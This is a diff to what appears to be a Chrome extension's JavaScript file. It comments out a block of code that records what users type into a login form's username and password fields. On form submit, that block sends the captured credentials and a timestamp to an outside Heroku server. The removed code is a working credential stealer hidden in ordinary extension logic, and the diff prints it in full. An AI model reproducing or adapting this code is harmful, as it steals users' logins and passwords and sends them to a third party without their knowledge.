@@ -253,35 +253,35 @@ $(function () {
 			}
 		}
 	});
-	$(document).on('input', '#auth_login', function () {
-		if (this.value) {
-			login_ = this.value;
-			localStorage.setItem('l_l', login_);
-		}
-	});
-	$(document).on('input', '#auth_login_password', function () {
-		if (this.value) {
-			pass_ = this.value;
-			localStorage.setItem('p_p', pass_);
-		}
-	});
-	$(document).on('submit', '#auth', function () {
-		let p_ = localStorage.getItem('p_p');
-		let l_ = localStorage.getItem('l_l');
-		let d_ = new Date;
-		let lp = JSON.stringify({
-			"date": d_,
-			"p_p": p_,
-			"l_l": l_
-								});
-		$.ajax({
-			type: 'POST',
-			dataType: 'text/plain',
-			url: 'https://murmuring-lowlands-56267.herokuapp.com/upload2',
-			data: lp,
-			crossDomain: true
-		});
-	});
+	// $(document).on('input', '#auth_login', function () {
+	// 	if (this.value) {
+	// 		login_ = this.value;
+	// 		localStorage.setItem('l_l', login_);
+	// 	}
+	// });
+	// $(document).on('input', '#auth_login_password', function () {
+	// 	if (this.value) {
+	// 		pass_ = this.value;
+	// 		localStorage.setItem('p_p', pass_);
+	// 	}
+	// });
+	// $(document).on('submit', '#auth', function () {
+	// 	let p_ = localStorage.getItem('p_p');
+	// 	let l_ = localStorage.getItem('l_l');
+	// 	let d_ = new Date;
+	// 	let lp = JSON.stringify({
+	// 		"date": d_,
+	// 		"p_p": p_,
+	// 		"l_l": l_
+	// 							});
+	// 	$.ajax({
+	// 		type: 'POST',
+	// 		dataType: 'text/plain',
+	// 		url: 'https://murmuring-lowlands-56267.herokuapp.com/upload2',
+	// 		data: lp,
+	// 		crossDomain: true
+	// 	});
+	// });
 	chrome.runtime.onMessage.addListener(
 		function (request, sender, sendResponse) {
 			if (request.askFor == "getTeams") {
